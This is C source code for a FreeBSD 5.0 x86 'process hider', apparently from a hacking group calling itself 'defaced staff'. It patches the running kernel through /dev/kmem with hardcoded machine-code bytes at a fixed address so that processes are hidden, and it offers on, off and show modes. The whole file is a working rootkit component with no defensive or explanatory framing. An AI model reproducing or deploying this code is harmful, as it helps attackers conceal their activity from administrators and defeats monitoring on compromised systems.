// FreeBSD 5.0-Release (x86) process hider by defaced staff

#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

#define  START       0xc02e40bb
#define  CLIP_SZ     11
#define  RET_SZ      10
#define  SIZE        CLIP_SZ + RET_SZ

char clip_code[] =

// clip_code freebsd/x86   11 bytes magic
"\x8b\x4b\x54"
"\x6a\x21"
"\x5a"
"\x39\xd1"
"\x75\x01"
"\x40"

// ret
"\x8b\x5d\xf8"
"\x8b\x75\xfc"
"\x89\xec"
"\x5d"
"\xc3";


int main(int argc, char *argv[])
{
  unsigned int fd, c ,a=0;
  unsigned char b;

  if (argc < 2)
  {
    printf("usage: %s < on | off | show >\n", argv[0]);
    return 0;
  }

  if (strcmp(argv[1], "on") == 0) a = 1;
  if (strcmp(argv[1], "off") == 0) a = 2;
  if (strcmp(argv[1], "show") == 0) a = 3;

  if (a == 0) return 0;

  fd = open("/dev/kmem", O_RDWR);

  if (fd < 0)
  {
    printf("[-] cant open /dev/kmem\n");
    return 0;
  }

  if (lseek(fd, START, 0) < 0)
  {
    printf("[-] cant do lseek()\n");
    close(fd);
    return 0;
  }

  if (a == 1)
  {
    write(fd, &clip_code, SIZE);
    printf("process hiding is on\n");
  } else if (a == 2) {
    b = 0x90;
    for (a=0; a < CLIP_SZ; a++) write(fd, &b, 1);
    printf("process hiding is off\n");
  } else if (a == 3) {

    for (a=0; a < SIZE; a++)
    {
      read(fd, &b, 1);
      printf("%i: 0x%x\n", a, b);
    }

  }

  close(fd);
  return 0;
}